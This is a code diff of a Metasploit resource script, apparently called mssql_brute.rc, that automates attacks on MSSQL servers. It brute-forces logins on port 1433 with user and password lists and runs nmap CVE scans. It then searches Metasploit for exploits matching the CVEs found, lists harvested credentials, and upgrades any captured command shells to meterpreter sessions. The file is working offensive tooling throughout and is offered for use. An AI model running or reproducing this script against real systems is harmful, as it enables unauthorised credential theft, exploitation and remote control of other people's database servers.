@@ -36,9 +36,24 @@
       ## Make sure we are connected to db
       unless framework.db.active
         File.delete("ip_range.txt") if File.exist?("ip_range.txt")
-        print_error("Database not connected to postgresql.")
-        print_warning("[execute] service postgresql start")
-        run_single("exit")
+        print_error("[ERROR] Database not connected to postgresql.")
+        Rex::sleep(2.0)
+        err = %Q|
+
+    Remark
+    ------
+    This resource script requires the msf database connected to postgresql.
+
+    Connect DB To Postgresql
+    ------------------------
+    [execute] service postgresql start
+    [execute] msfconsole -q -x 'resource mssql_brute.rc'
+
+        |
+        print_line(err)
+        print_error("please wait, cleaning recent configurations.")
+        run_single("unsetg all")
+        run_single("exit -y")
         return nil
       else
         local = Dir.pwd
@@ -91,6 +106,27 @@
       end
       print_line("")
       run_single("services")
+
+      ## rhosts geolocation (geoip-bin)
+      if (File.exist?("/usr/bin/geoiplookup"))
+         print_line("Geo-Location")
+         print_line("------------")
+         ## Mapping database hosts (loop)
+         framework.db.hosts.map(&:address).each do |sHost|
+            geo_location = `geoiplookup #{sHost}|cut -d ':' -f2|tr -d '\n'`
+            spl_range = sHost.split('.')
+               ## Make sure we are NOT geolocating Internal ip(s)
+               if (spl_range[0] == "192" and spl_range[1] == "168")
+                  print_line("#{sHost} -  Not available (Internal IP Address)")
+               else
+                  print_line("#{sHost} - #{geo_location}")
+               end
+         end
+      end
+
+      print_line("")
+      Rex::sleep(2.0)
+      ## Read the database (metasploit)
       print_good("Sellecting target hosts from msf database.")
       xhost = framework.db.hosts.map(&:address).join(' ')
       xport = framework.db.services.map(&:port).join(' ')
@@ -162,7 +198,6 @@
 
     sudo wget https://raw.githubusercontent.com/OCSAF/freevulnsearch/master/freevulnsearch.nse
     sudo cp freevulnsearch.nse /usr/share/nmap/scripts/freevulnsearch.nse
-    sudo nmap --script-updatedb
 
     sudo wget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse
     sudo cp vulners.nse /usr/share/nmap/scripts/vulners.nse
@@ -190,13 +225,13 @@
            run_single("use auxiliary/scanner/mssql/mssql_ping")
            run_single("set THREADS 16")
            print_line("")
-           run_single("services -c port -S 1433 -R")
+           run_single("services -c port -p 1433 -R")
            run_single("exploit")
            run_single("use auxiliary/scanner/mssql/mssql_login")
            run_single("set PASS_FILE #{framework.datastore['PASS_FILE']}")
            run_single("set USER_FILE #{framework.datastore['USER_FILE']}")
            print_line("")
-           run_single("services -c port -S 1433 -R")
+           run_single("services -c port -p 1433 -R")
            run_single("exploit")
       end
 
@@ -205,6 +240,11 @@
             question = gets.chomp
 
          if question == "y" or question == "Y"
+            print "[?] Use 'freevulnsearch.nse' or 'vulners.nse'? :"
+            query_nse = gets.chomp
+            if query_nse.nil? or query_nse == ''
+                query_nse = "vulners.nse"
+            end
             displ = %Q|
 
          MMMMMMMMMMM'""""'YMMM  MM""MMMMM""MM  MM""""""""`MMMMMMMMMM
@@ -219,20 +259,49 @@
 
             |
             print_line(displ)
-            print_warning("Running CVE checks againts: #{framework.datastore['RHOSTS']}")
-            run_single("db_nmap -sV -T4 -Pn --script=freevulnsearch.nse,vulners.nse #{framework.datastore['RHOSTS']}")
+            print_good("[#{query_nse}] Running CVE checks againts: #{framework.datastore['RHOSTS']}")
+            run_single("db_nmap -sV -v -T4 -Pn -n --script=#{query_nse} #{framework.datastore['RHOSTS']} --open -oN CVEs.txt")
+            ## suggest exploits based on CVE number
+            query_numb = `cat CVEs.txt|grep -m 20 'CVE-'|awk {'print $2'}|cut -d '-' -f1,2,3`
+            # Make sure we get any CVE number back
+            parse_trail = query_numb.split(' ')
+            unless (parse_trail.empty? or parse_trail.nil? or parse_trail == '')
+                print "[?] Suggest exploits to CVEs found ? (y/n):"
+                query_cve = gets.chomp
+                if query_cve == "y" or query_cve == "Y"
+                    # Use msfconsole search core command to search for compatible exploits
+                    print_line("")
+                    print_good("searching in metasploit database for compatible exploits..")
+                    Rex::sleep(1.0)
+                    (parse_trail).each do |id|
+                       print_status("search cve:#{id} type:exploit rank:good rank:great rank:excellent")
+                       Rex::sleep(0.5)
+                       run_single("search cve:#{id} type:exploit rank:good rank:great rank:excellent")
+                       Rex::sleep(1.0)
+                    end
+                end
+            else
+                # None CVEs IDs found in nmap scans
+                print_error("[NONE CVEs FOUND] Abort Suggest exploits module execution.")
+                Rex::sleep(1.5)
+            end
          end
 
-      ## Save current database to local file (database.xml)
-      if (framework.datastore['SAVE_DB'] == "true")
-         rand = Rex::Text.rand_text_alpha(5)
-         print_warning("Exporting database to: #{local}/logs/database_#{rand}.xml")
-         run_single("db_export -f xml -a #{local}/logs/database_#{rand}.xml")
+      ## Make sure logs folder exists!
+      if File.directory?("#{local}/logs")
+         ## Save current database to local file (xml)
+         if (framework.datastore['SAVE_DB'] == "true")
+            rand = Rex::Text.rand_text_alpha(5)
+            print_warning("Exporting database to: #{local}/logs/database_#{rand}.xml")
+            run_single("db_export -f xml -a #{local}/logs/database_#{rand}.xml")
+         end
       end
 
       print_line("")
       ## Display active sessions
       run_single("sessions -l")
+      print_line("")
+      run_single("creds")
       print_line("")
       ## Cleaning database and unset global variables
       print_warning("Cleaning global variables.")
@@ -241,17 +310,31 @@
       run_single("unset all")
       run_single("workspace -d mosquito")
 
-      ## Writting ['xhost(s)'] to mosquito logfile
-      if File.directory?("#{local}/logs")
-         dtr = `date`
-         print_status("Logfile stored under: #{local}/logs/mssql_brute.log")
-         run_single("echo \"[#{dtr}] mssql_brute: #{xhost}\" >> logs/mosquito.log")
-         ## Store vulns log if exists open sessions
-         if (framework.sessions.length > 0)
-            run_single("vulns -o #{local}/logs/mssql_brute.csv")
+      ## Upgrade command shell to meterpreter?
+      if (framework.sessions.length > 0)
+         print "[?] Upgrade command shell to meterpreter? (y/n):"
+         upgrate_met = gets.chomp
+         if upgrate_met == "y" or upgrate_met == "Y"
+         run_single("use post/multi/manage/shell_to_meterpreter")
+            # Loop truth sessions to grab the session ID
+            framework.sessions.each_key do |sid|
+               run_single("set SESSION #{sid}")
+               run_single("run")
+            end
+            print_line("")
+            run_single("sessions -l")
+            print_line("")
          end
       end
 
+      dtr = `date`
+      ## Writting ['xhost(s)'] to mosquito logfile
+      if File.directory?("#{local}/logs")
+         print_status("Logfile stored under: #{local}/logs/mssql_brute.log")
+         run_single("echo \"[#{dtr}] mssql_brute: #{xhost}\" >> logs/mosquito.log")
+      end
+
+      File.delete("CVEs.txt") if File.exist?("CVEs.txt")
    File.delete("ip_range.txt") if File.exist?("ip_range.txt")
    run_single("back")
 </ruby>
